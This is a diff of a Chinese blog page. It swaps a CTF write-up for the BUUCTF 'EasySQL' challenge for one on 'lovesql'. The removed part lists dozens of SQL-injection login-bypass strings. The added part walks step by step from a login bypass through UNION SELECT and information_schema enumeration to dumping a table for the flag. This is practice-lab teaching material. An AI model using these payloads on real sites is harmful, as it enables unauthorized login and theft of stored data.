@@ -3,26 +3,33 @@
 <head>
   <meta charset="utf-8">
   
-  <title>10-buu练习EasySQL | baba童鞋的博客</title>
+  <title>11-buu练习lovesql | baba童鞋的博客</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="打开题目链接，如下：尝试万能密码：用户名–&gt;admin；密码–&gt;1’or’1’&#x3D;’1竟然真的出来了真是轻松的一天！（难得啊） 接下来总结一下万能密码： aspx万能密码   asp aspx万能密码   1 &quot;or “a”&#x3D;&quot;a   2： ‘.).or.(’.a.’&#x3D;’.a   3： or 1&#x3D;1–   4： &#39;or 1&#x3D;1–   5： a’or’ 1&#x3D;1–   6： &quot;or 1&#x3D;1–">
+  <meta name="description" content="打开题目链接。界面如下；尝试使用万能密码：  用户名：1&#39; or 1&#x3D;1# 密码：222（任意三个数）  跳转到check.php界面：   得到了用户名和密码开始注入在url中输入；  1.&#x2F;check.php?username&#x3D;admin&#39; order by 3%23&amp;password&#x3D;1     存在 2.&#x2F;check.php?username&#x3D;admin&#39; order by 4%23&amp;pa">
 <meta property="og:type" content="article">
-<meta property="og:title" content="10-buu练习EasySQL">
-<meta property="og:url" content="http://example.com/2021/01/24/sql/index.html">
+<meta property="og:title" content="11-buu练习lovesql">
+<meta property="og:url" content="http://example.com/2021/01/25/love/index.html">
 <meta property="og:site_name" content="baba童鞋的博客">
-<meta property="og:description" content="打开题目链接，如下：尝试万能密码：用户名–&gt;admin；密码–&gt;1’or’1’&#x3D;’1竟然真的出来了真是轻松的一天！（难得啊） 接下来总结一下万能密码： aspx万能密码   asp aspx万能密码   1 &quot;or “a”&#x3D;&quot;a   2： ‘.).or.(’.a.’&#x3D;’.a   3： or 1&#x3D;1–   4： &#39;or 1&#x3D;1–   5： a’or’ 1&#x3D;1–   6： &quot;or 1&#x3D;1–">
+<meta property="og:description" content="打开题目链接。界面如下；尝试使用万能密码：  用户名：1&#39; or 1&#x3D;1# 密码：222（任意三个数）  跳转到check.php界面：   得到了用户名和密码开始注入在url中输入；  1.&#x2F;check.php?username&#x3D;admin&#39; order by 3%23&amp;password&#x3D;1     存在 2.&#x2F;check.php?username&#x3D;admin&#39; order by 4%23&amp;pa">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/01/24/sql/sql2.png">
-<meta property="og:image" content="http://example.com/2021/01/24/sql/sql1.png">
-<meta property="article:published_time" content="2021-01-24T09:51:45.000Z">
-<meta property="article:modified_time" content="2021-01-25T08:43:56.472Z">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love1.png">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love2.png">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love3.png">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love4.png">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love6.png">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love7.png">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love8.png">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love9.png">
+<meta property="og:image" content="http://example.com/2021/01/25/love/love10.png">
+<meta property="article:published_time" content="2021-01-25T08:12:19.000Z">
+<meta property="article:modified_time" content="2021-01-25T09:45:08.992Z">
 <meta property="article:author" content="Jialu">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/01/24/sql/sql2.png">
+<meta name="twitter:image" content="http://example.com/2021/01/25/love/love1.png">
   
     <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
   
@@ -174,11 +181,11 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap"><article id="post-sql" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-love" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/01/24/sql/" class="article-date">
-  	<time datetime="2021-01-24T09:51:45.000Z" itemprop="datePublished">2021-01-24</time>
+      <a href="/2021/01/25/love/" class="article-date">
+  	<time datetime="2021-01-25T08:12:19.000Z" itemprop="datePublished">2021-01-25</time>
 </a>
     </div>
   
@@ -191,7 +198,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      10-buu练习EasySQL
+      11-buu练习lovesql
       
     </h1>
   
@@ -209,148 +216,58 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目链接，如下：<br><img src="/2021/01/24/sql/sql2.png"><br>尝试万能密码：<br>用户名–&gt;admin；<br>密码–&gt;1’or’1’=’1<br><img src="/2021/01/24/sql/sql1.png"><br>竟然真的出来了<br>真是轻松的一天！（难得啊）</p>
-<h2>接下来总结一下万能密码：</h2>
-<h3>aspx万能密码</h3>
-<table border="1">
-<tr>
-<td>asp</td>
-<td>aspx万能密码</td>
-</tr>
-<tr>
-<td>1</td>
-<td>"or “a”="a</td>
-</tr>
-<tr>
-<td>2：</td>
-<td>‘.).or.(’.a.’=’.a</td>
-</tr>
-<tr>
-<td>3：</td>
-<td>or 1=1–</td>
-</tr>
-<tr>
-<td>4：</td>
-<td>'or 1=1–</td>
-</tr>
-<tr>
-<td>5：</td>
-<td>a’or’ 1=1–</td>
-</tr>
-<tr>
-<td>6：</td>
-<td>"or 1=1–</td>
-</tr>
-<tr>
-<td>7：</td>
-<td>'or.‘a.’='a</td>
-</tr>
-<tr>
-<td>8：</td>
-<td>“or”="a’='a</td>
-</tr>
-<tr>
-<td>9：</td>
-<td>‘or’’=’</td>
-</tr>
-<tr>
-<td>10：</td>
-<td>‘or’=‘or’</td>
-</tr>
-<tr>
-<td>11：</td>
-<td>admin’or 1=1#</td>
-</tr>
+        <p>打开题目链接。界面如下；<br><img src="/2021/01/25/love/love1.png"><br>尝试使用万能密码：</p>
+<ul>
+<li>用户名：1' or 1=1#
+</li><li>密码：222（任意三个数）
+</li></ul>
+跳转到check.php界面：
 
-<table border="1">
-<h3>PHP万能密码</h3>
-<tr>
-<td>php</td><td>PHP万能密码</td>
-</tr>
-<tr>
-<td>1</td><td>'or 1=1/*</td>
-</tr>
-<tr>
-<td>2</td><td>"or “a”="a</td>
-</tr>
-<tr>
-<td>3</td><td>"or 1=1–</td>
-</tr>
-<tr>
-<td>4</td><td>“or”="</td>
-</tr>
-<tr>
-<td>5</td><td>“or”="a’='a</td>
-</tr>
-<tr>
-<td>6</td><td>"or1=1–</td>
-</tr>
-<tr>
-<td>7</td><td>“or=or”</td>
-</tr>
-<tr>
-<td>8</td><td>'‘or’=‘or’</td>
-</tr>
-<tr>
-<td>9</td><td>') or (‘a’='a</td>
-</tr>
-<tr>
-<td>10</td><td>‘.).or.(’.a.’=’.a</td>
-</tr>
-<tr>
-<td>11</td><td>'or 1=1</td>
-</tr>
-<tr>
-<td>12</td><td>'or 1=1–</td>
-</tr>
-<tr>
-<td>13</td><td>'or 1=1/*</td>
-</tr>
-<tr>
-<td>14</td><td>‘or"="a’='a</td>
-</tr>
-<tr>
-<td>15</td><td>‘or’ ‘1’=‘1’</td>
-</tr>
-<tr>
-<td>16</td><td>‘or’’=’</td>
-</tr>
-<tr>
-<td>17</td><td>‘or’’=’‘or’’=’</td>
-</tr>
-<tr>
-<td>18</td><td>‘or’=‘1’</td>
-</tr>
-<tr>
-<td>19</td><td>‘or’=‘or’</td>
-</tr>
-<tr>
-<td>20</td><td>'or.‘a.’='a</td>
-</tr>
-<tr>
-<td>21</td><td>'or1=1–</td>
-</tr>
-<tr>
-<td>22</td><td>1’or’1’='1</td>
-</tr>
-<tr>
-<td>23</td><td>a’or’ 1=1–</td>
-</tr>
-<tr>
-<td>24</td><td>a’or’1=1–</td>
-</tr>
-<tr>
-<td>25</td><td>or ‘a’=‘a’</td>
-</tr>
-<tr>
-<td>26</td><td>or 1=1–</td>
-</tr>
-<tr>
-<td>27</td><td>or1=1–</td>
-</tr>
-<tr>
-<td>admin’/*</td><td>密码*/’</td>
-</tr></table></table>
+<p><img src="/2021/01/25/love/love2.png"></p>
+<p>得到了用户名和密码<br>开始注入<br>在url中输入；</p>
+<ul>
+<li>1./check.php?username=admin' order by 3%23&password=1     存在
+</li><li>2./check.php?username=admin' order by 4%23&password=1     存在
+</li><li>3./check.php?username=admin' order by 3%23&password=1     存在
+</li><li>4./check.php?username=admin' order by 4%23&password=1     报错
+</li></ul>
+注意：由于是在url中输入的内容，所以不能用#，而用它的url编码%23。
+输入4时界面如下：
+
+<p><img src="/2021/01/25/love/love3.png"></p>
+<p>由此可知，有3个字段。用union查询测试注入点（回显点位）：</p>
+<ul>
+<li>/check.php?username=1' union select 1,2,3%23&password=1
+</li></ul>
+
+<p><img src="/2021/01/25/love/love4.png"></p>
+<p>回显点位是2和3，查询数据库名及版本：</p>
+<ul>
+<li>/check.php?username=1' union select 1,database(),version()%23&password=1
+</li></ul>
+可知用户名为：geek
+接下来爆表：
+<ul>
+<li>/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
+</li></ul>
+
+<p><img src="/2021/01/25/love/love6.png"></p>
+<p>爆出geekyser和l0ve1ysq1两个表，我们试一下geekuser这个表：<br>爆字段：</p>
+<ul>
+<li>/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'%23&password=1
+</li></ul>
+
+<p><img src="/2021/01/25/love/love7.png"></p>
+<p>得到三个字段：id，username，password。<br>爆数据：</p>
+<ul>
+<li>/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
+</li></ul>
+
+<p><img src="/2021/01/25/love/love8.png"></p>
+<p><img src="/2021/01/25/love/love9.png"></p>
+<p>得到flag！<br>被sql支配的一天</p>
+<p><img src="/2021/01/25/love/love10.png"></p>
+
       
     </div>
     
@@ -359,18 +276,9 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/01/25/love/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">&lt;</strong>
-      <div class="article-nav-title">
-        
-          11-buu练习lovesql
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/01/23/mdwu/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">9-buu练习Easy MD5</div>
+    <a href="/2021/01/24/sql/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">10-buu练习EasySQL</div>
       <strong class="article-nav-caption">&gt;</strong>
     </a>
   
@@ -380,7 +288,7 @@
 </article>
 
 
-<div class="ds-share share" data-thread-key="sql" data-title="10-buu练习EasySQL" data-url="http://example.com/2021/01/24/sql/"  data-images="/img/huahua.jpg" data-content="10-buu练习EasySQL">
+<div class="ds-share share" data-thread-key="love" data-title="11-buu练习lovesql" data-url="http://example.com/2021/01/25/love/"  data-images="/img/huahua.jpg" data-content="11-buu练习lovesql">
     <div class="ds-share-inline">
       <ul  class="ds-share-icons-16">
       	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
